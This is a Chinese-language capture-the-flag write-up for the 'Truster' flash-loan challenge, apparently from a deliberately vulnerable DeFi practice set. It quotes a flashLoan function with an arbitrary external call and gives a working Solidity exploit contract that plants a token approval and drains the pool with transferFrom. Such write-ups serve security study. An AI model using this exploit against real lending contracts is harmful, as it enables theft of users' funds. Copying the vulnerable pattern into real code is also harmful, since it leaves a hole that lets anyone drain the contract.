# Truster (24/09/02)

## 题目介绍

> 越来越多的贷款池正在提供闪借贷款。在这种情况下，一个新的池已经启动，免费提供DVT代币的闪款。
>
> 该池持有100万个DVT代币。你一无所有。
>
> 要通过这一挑战，请拯救池中执行单笔交易的所有资金。将资金存入指定的回收账户。

## 合约分析

就一个合约然后一个flashloan的函数，内部有一个任意外部调用漏洞。发现前后验证两次余额是否一致，可以直接接收者指定当前合约或者攻击合约数量为0指定攻击合约都可以。调用代币的approve函数授权到攻击合约。之后直接转移代币。完成攻击。

``` solidity
      function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```



## 解题过程

直接任意外部调用代币的approve到攻击合约，再通过transferfrom转移代币完成攻击，
poc

``````solidity
 contract Exploit {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recoveryAddress) payable {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)));
        pool.flashLoan(10000, address(pool), address(token), data);
        token.transferFrom(address(pool), address(recoveryAddress), token.balanceOf(address(pool)));
    }
}
``````
